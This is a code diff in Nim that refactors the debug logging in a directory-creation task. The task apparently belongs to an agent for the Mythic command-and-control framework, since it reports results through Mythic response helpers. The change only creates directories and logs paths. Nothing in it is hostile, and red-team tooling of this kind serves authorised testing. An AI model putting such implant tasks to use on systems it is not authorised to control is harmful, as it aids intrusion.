@@ -1,5 +1,5 @@
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import std/[json, os, strformat, strutils]
 
 type
@@ -7,13 +7,10 @@ type
     path: string
 
 proc makeDirectory*(taskId: string, params: string): JsonNode =
-  let cfg = getConfig()
-  
   # Parse arguments
   let args = parseJson(params).to(MkdirArgs)
   
-  if cfg.debug:
-    echo "[DEBUG] Creating directory: ", args.path
+  debug "[DEBUG] Creating directory: ", args.path
   
   try:
     # Create the directory (including parent directories)
@@ -27,8 +24,7 @@ proc makeDirectory*(taskId: string, params: string): JsonNode =
     
     let normalizedPath = normalizedPath(absPath)
     
-    if cfg.debug:
-      echo "[DEBUG] Created directory: ", normalizedPath
+    debug "[DEBUG] Created directory: ", normalizedPath
     
     return mythicSuccess(taskId, &"Created directory '{normalizedPath}'")
     
